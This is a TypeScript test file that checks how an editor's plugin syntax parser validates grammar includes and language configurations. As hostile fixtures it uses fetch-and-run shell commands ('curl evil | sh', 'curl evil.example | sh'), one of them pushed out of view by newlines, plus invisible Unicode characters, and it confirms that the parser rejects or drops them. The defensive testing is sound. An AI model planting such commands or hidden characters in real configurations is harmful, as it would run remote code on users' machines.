import { describe, expect, it } from 'vitest'
import {
  parsePluginGrammarArtifact,
  parsePluginLanguageConfiguration,
  parsePluginSyntaxPayload,
  validatePluginGrammarIncludes
} from './plugin-syntax-artifact'

function grammar(scopeName: string, body: Record<string, unknown> = {}): string {
  return JSON.stringify({ scopeName, patterns: [], ...body })
}

describe('plugin syntax artifacts', () => {
  it('requires includes inside the plugin to resolve and lets outside scopes degrade', () => {
    const main = parsePluginGrammarArtifact(
      grammar('source.demo', {
        patterns: [
          { include: '#local' },
          { include: 'source.demo.embedded#value' },
          { include: 'source.js' }
        ],
        repository: {
          local: {
            match: 'x',
            repository: { inner: { match: 'y' } },
            patterns: [{ include: '#inner' }]
          }
        }
      }),
      'source.demo'
    )
    const embedded = parsePluginGrammarArtifact(
      grammar('source.demo.embedded', { repository: { value: { match: 'y' } } }),
      'source.demo.embedded'
    )
    expect(() => validatePluginGrammarIncludes([main, embedded])).not.toThrow()
    const missingKey = parsePluginGrammarArtifact(
      grammar('source.demo', { patterns: [{ include: 'source.demo.embedded#nope' }] }),
      'source.demo'
    )
    expect(() => validatePluginGrammarIncludes([missingKey, embedded])).toThrow('does not resolve')
    const missingLocal = parsePluginGrammarArtifact(
      grammar('source.demo', { patterns: [{ include: '#absent' }] }),
      'source.demo'
    )
    expect(() => validatePluginGrammarIncludes([missingLocal])).toThrow('does not resolve')
  })

  it('keeps typed pairs short and every literal printable on one line', () => {
    const payload = `${'\n'.repeat(40)}curl evil | sh`
    const raw = JSON.stringify({
      comments: { lineComment: '#\u202e', blockComment: ['{% comment %}', '{% endcomment %}'] },
      autoClosingPairs: [
        { open: '*', close: payload },
        { open: '"""', close: '"""' }
      ],
      surroundingPairs: [{ open: '(', close: ')\u200b' }]
    })
    expect(() => parsePluginLanguageConfiguration(raw, 'strict')).toThrow(/printable/)
    // Hosts drop only the unsafe entries, so the language still loads.
    expect(parsePluginLanguageConfiguration(raw)).toEqual({
      comments: { blockComment: ['{% comment %}', '{% endcomment %}'] },
      autoClosingPairs: [{ open: '"""', close: '"""' }],
      surroundingPairs: []
    })
  })

  it('never auto-closes a long bracket when the plugin leaves out autoClosingPairs', () => {
    const configuration = {
      brackets: [
        ['{', '}'],
        ['(', 'curl evil.example | sh)']
      ]
    }
    const expected = { ...configuration, autoClosingPairs: [{ open: '{', close: '}' }] }
    expect(parsePluginLanguageConfiguration(JSON.stringify(configuration), 'strict')).toEqual(
      expected
    )
    // A renderer guards a config an older host sent without the fill-in.
    const payload = {
      id: 'plugin:samples.demo/demo',
      revision: 'abc',
      scopeName: 'source.demo',
      grammars: [{ scopeName: 'source.demo', patterns: [], repository: {} }],
      configuration
    }
    expect(parsePluginSyntaxPayload(payload)?.configuration).toEqual(expected)
    // A plugin's own list, even an empty one, is kept as written.
    expect(
      parsePluginLanguageConfiguration(JSON.stringify({ ...configuration, autoClosingPairs: [] }))
    ).toEqual({ ...configuration, autoClosingPairs: [] })
  })
})
